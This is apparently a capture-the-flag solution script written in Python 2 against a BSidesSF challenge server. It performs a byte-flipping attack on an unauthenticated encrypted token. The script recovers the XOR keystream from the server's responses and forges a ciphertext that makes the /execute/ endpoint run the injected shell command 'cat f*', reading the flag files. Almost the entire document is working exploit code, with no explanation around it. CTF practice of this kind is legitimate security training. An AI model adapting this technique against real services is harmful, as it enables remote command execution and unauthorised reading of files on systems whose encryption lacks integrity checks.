import requests

base = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/"
enc = "1ea2a904b584dc401765fa1f38f05963355e14a9e2baf664cfd9f67c2f10cba2a82a1ac7a41298eaa42911c441354ba289def8befdaba1f50fd4eb622a8c596d5b0333f3ec7bdf57772ff353ed336ce00ba20919e88ede9e8a3faaad8b5eb84ccf333c761d4a0479eae1107c2a1d9ec3"
enc = enc.decode('hex')

new = enc

want = "c(cat f*) "
start_offset = 6

for i in range(start_offset, start_offset+len(want)+1):
    have = requests.get(base+new.encode('hex')).text.replace('<pre>', '').replace('</pre>', '')
    if want[i-start_offset] != have[i-start_offset]:
        print new.encode('hex'), have
        
        nums = [0b01010101, 0b00110011]
        resps = []
        for n in nums:
            tmp = new[:i] + chr(n) + new[i+1:]
            resps.append(requests.get(base+tmp.encode('hex')).content.replace('<pre>', '').replace('</pre>', ''))
    
        maxl = 0
        m = 0
        for j, resp in enumerate(resps):
            if len(resp) > maxl:
                maxl = len(resp)
                m = j
        if maxl:
            xor = ord(resps[m][i-start_offset]) ^ nums[m]
            print "Got xor {} for pos {}".format(xor, i)
            new = new[:i] + chr((ord(want[i-start_offset]) ^ xor) & 0xff) + new[i+1:]
        else:
            break

# Change 0x4d in enc to 0x9b ($)